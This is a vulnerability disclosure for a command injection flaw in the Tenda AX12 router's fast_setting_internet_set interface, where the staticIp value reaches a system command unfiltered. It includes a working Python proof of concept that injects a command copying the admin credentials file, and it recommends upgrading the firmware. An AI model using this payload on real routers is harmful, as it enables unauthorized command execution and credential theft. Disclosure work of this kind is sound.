## Vulnerability description ##

Equipment: Tenda-AX12

Firmware version: V22.03.01.16_CN([AX12 upgrade software_Tenda official website](https://www.tenda.com.cn/download/detail-3170.html))

Vulnerability Type: Command Injection

Attack effect: execute any command

## Vulnerability description ##

The reason for this vulnerability is that in the provided fast_setting_internet_set interface, the called function sub_42581C does not filter the value of the controllable parameter staticIp passed in by the user, resulting in command injection.

sub_42581C()
![](D:\learning record\学术报告\路由器\Tenda\AX12\2\image\1.png)

It first obtains the value of the staticIp parameter and assigns it to v4, then calls the sprintf function to format the input to the v5 string, and finally calls doSystemCmd_route to execute the command. In the process, no character filtering is performed on the value of staticIp, which means that we can construct any command through this parameter, and finally enter doSystemCmd_route for execution.

## POC ##

The poc injected by the command, in actual situation, needs to be authenticated first.

```python
import requests

url = "http://192.168.112.131/goform/fast_setting_internet_set"
cmds = ";cp /etc/config/admin /tmp/hack;"


payload = {'wanType': '1', 'staticIp': cmds}
r = requests.post(url, data=payload)
print(r.status_code)
print(r.content)
```

The effect of the attack is as follows. The admin file that saves the userpass in the configuration directory is copied to tmp/hack.
![](.\image\2.png)

### Suggest

It is recommended to upgrade the firmware to the latest version, [V22.03.01.21](https://www.tenda.com.cn/download/detail-3237.html).
